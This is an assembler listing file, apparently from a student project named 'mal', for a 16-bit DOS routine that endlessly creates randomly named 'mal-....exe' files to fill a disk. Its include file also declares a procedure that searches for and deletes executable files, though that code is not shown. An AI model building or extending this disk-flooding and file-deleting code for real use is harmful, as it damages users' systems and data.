Microsoft (R) Macro Assembler Version 6.15.8803		    12/06/19 09:13:28
_gen_rand_files.asm					     Page 1 - 1


				INCLUDE mal.inc
			      C .NOLIST
			      C 
			      C 
			      C 
			      C search_exe_files_and_delete PROTO, ptrDTA:PTR BYTE, ptrDEL:PTR BYTE
			      C 
			      C delete_file PROTO
			      C 
			      C generate_random_exe_files PROTO, RAND:BYTE, rand_file_size:BYTE, ptrRAND:PTR BYTE
			      C 
			      C create_file PROTO
			      C 
			      C close_file PROTO
			      C .LIST
			      C 

 0000				.code

 0000					generate_random_exe_files PROC, RAND:BYTE, rand_file_size:BYTE, ptrRAND:PTR BYTE
					
					;Requires random_file to be created
					;Uses ecx,si,eax,al,dx,bx registers and create_file and close_file functions
					;Generates mal-...exe files infinitely or upto n times
					
 0003  E8 0000 E				call randomize			;Re-seeds random number generator with current time in hundredths of seconds
						
						;mov ecx, 0
 0006						create_random_exe_file:
 0006  BE 0004						mov si, 4			;Because we need to insert after - in 'mal-' which is 4 index 
 0009							randomize_and_move:
 0009  66| B8 0000000A						mov eax, 10
 000F  E8 0000 E						call RandomRange
								
 0012  0C 30							or al, 00110000b		;Because moving a number in a string will make it be read as ascii so converting to ascii here
 0014  88 42 04							mov RAND[si], al
								
 0017  46							inc si
 0018  83 FE FC							cmp si, (LENGTHOF rand_file_size) - 5		;-5 is being done here because last five characters are '.exe,0'
 001B  72 EC							JB randomize_and_move
						
							;mov dx, OFFS-ET random_file
							;call Writestring
							
 001D  8B 56 08						mov dx, ptrRAND
							INVOKE create_file		;Requires dx to have file name
							
 0023  8B D8						mov bx, ax			;'create_file' moves file handle in ax
							INVOKE close_file		;Requires bx to have file handle
							
 0028  EB DC						JMP create_random_exe_file
					
						ret
						
 002E					generate_random_exe_files ENDP
					
				END
Microsoft (R) Macro Assembler Version 6.15.8803		    12/06/19 09:13:28
_gen_rand_files.asm					     Symbols 2 - 1




Macros:

                N a m e                 Type

startup  . . . . . . . . . . . .	Proc


Structures and Unions:

                N a m e                  Size
                                         Offset      Type

ExtGetDskFreSpcStruc . . . . . .	 002C
  StructSize . . . . . . . . . .	 0000	     Word
  Level  . . . . . . . . . . . .	 0002	     Word
  SectorsPerCluster  . . . . . .	 0004	     DWord
  BytesPerSector . . . . . . . .	 0008	     DWord
  AvailableClusters  . . . . . .	 000C	     DWord
  TotalClusters  . . . . . . . .	 0010	     DWord
  AvailablePhysSectors . . . . .	 0014	     DWord
  TotalPhysSectors . . . . . . .	 0018	     DWord
  AvailableAllocationUnits . . .	 001C	     DWord
  TotalAllocationUnits . . . . .	 0020	     DWord
  Rsvd . . . . . . . . . . . . .	 0024	     DWord
TimeRecord . . . . . . . . . . .	 0004
  hours  . . . . . . . . . . . .	 0000	     Byte
  minutes  . . . . . . . . . . .	 0001	     Byte
  seconds  . . . . . . . . . . .	 0002	     Byte
  hhss . . . . . . . . . . . . .	 0003	     Byte


Segments and Groups:

                N a m e                 Size     Length   Align   Combine Class

DGROUP . . . . . . . . . . . . .	GROUP
_DATA  . . . . . . . . . . . . .	16 Bit	 0000	  Word	  Public  'DATA'	
STACK  . . . . . . . . . . . . .	16 Bit	 1000	  Para	  Stack	  'STACK'	 
_TEXT  . . . . . . . . . . . . .	16 Bit	 002E	  Word	  Public  'CODE'	


Procedures,  parameters and locals:

                N a m e                 Type     Value    Attr

ClrScr . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Crlf . . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Delay  . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
DumpMem  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
DumpRegs . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Get_Commandtail  . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Get_Time . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Gotoxy . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
IsDigit  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Random32 . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
RandomRange  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Randomize  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadChar . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadHex  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadInt  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadString . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_compare  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_copy . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_length . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_trim . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_ucase  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WaitMsg  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteBin . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteChar  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteDec . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteHex . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteInt . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteString  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
close_file . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
create_file  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
delete_file  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
generate_random_exe_files  . . .	P Near	 0000	  _TEXT	Length= 002E Public STDCALL
  RAND . . . . . . . . . . . . .	Byte	 bp + 0004
  rand_file_size . . . . . . . .	Byte	 bp + 0006
  ptrRAND  . . . . . . . . . . .	Word	 bp + 0008
  create_random_exe_file . . . .	L Near	 0006	  _TEXT	
  randomize_and_move . . . . . .	L Near	 0009	  _TEXT	
search_exe_files_and_delete  . .	P Near	 0000	  Length= 0000 External STDCALL


Symbols:

                N a m e                 Type     Value    Attr

@CodeSize  . . . . . . . . . . .	Number	 0000h	 
@DataSize  . . . . . . . . . . .	Number	 0000h	 
@Interface . . . . . . . . . . .	Number	 0003h	 
@Model . . . . . . . . . . . . .	Number	 0002h	 
@cmdline . . . . . . . . . . . .	Text   	 OFFSET __98765765cmdline
@code  . . . . . . . . . . . . .	Text   	 _TEXT
@data  . . . . . . . . . . . . .	Text   	 DGROUP
@fardata?  . . . . . . . . . . .	Text   	 FAR_BSS
@fardata . . . . . . . . . . . .	Text   	 FAR_DATA
@stack . . . . . . . . . . . . .	Text   	 DGROUP
black  . . . . . . . . . . . . .	Number	 0000h	 
blue . . . . . . . . . . . . . .	Number	 0001h	 
brown  . . . . . . . . . . . . .	Number	 0006h	 
cyan . . . . . . . . . . . . . .	Number	 0003h	 
exit . . . . . . . . . . . . . .	Text   	 .EXIT
gray . . . . . . . . . . . . . .	Number	 0008h	 
green  . . . . . . . . . . . . .	Number	 0002h	 
lightBlue  . . . . . . . . . . .	Number	 0009h	 
lightCyan  . . . . . . . . . . .	Number	 000Bh	 
lightGray  . . . . . . . . . . .	Number	 0007h	 
lightGreen . . . . . . . . . . .	Number	 000Ah	 
lightMagenta . . . . . . . . . .	Number	 000Dh	 
lightRed . . . . . . . . . . . .	Number	 000Ch	 
magenta  . . . . . . . . . . . .	Number	 0005h	 
red  . . . . . . . . . . . . . .	Number	 0004h	 
white  . . . . . . . . . . . . .	Number	 000Fh	 
yellow . . . . . . . . . . . . .	Number	 000Eh	 

	   0 Warnings
	   0 Errors
